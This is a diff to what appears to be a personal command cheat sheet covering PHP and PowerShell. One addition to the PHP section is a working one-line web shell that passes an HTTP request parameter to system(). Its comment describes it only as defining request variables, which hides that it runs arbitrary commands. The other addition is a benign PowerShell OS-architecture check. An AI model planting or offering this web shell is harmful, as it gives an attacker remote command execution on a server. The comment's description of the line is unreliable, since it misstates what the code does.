@@ -562,6 +562,9 @@ PHP
 # interactive mode
 php -a
 
+# define http request variables : parameter can be used in subsequent GET + POST requests
+<?php system($_REQUEST['parameter_name_here']); ?>
+
 
 PIP
 ---
@@ -599,6 +602,9 @@ New-PSDrive -Name "drive_name_here" -PSProvider "FileSystem" -Root "\\IP_here\sh
 
 # check process architecture
 [Environment]::Is64BitProcess
+
+# check OS architecture
+[Environment]::Is64BitOperatingSystem
 
 
 PYTHON
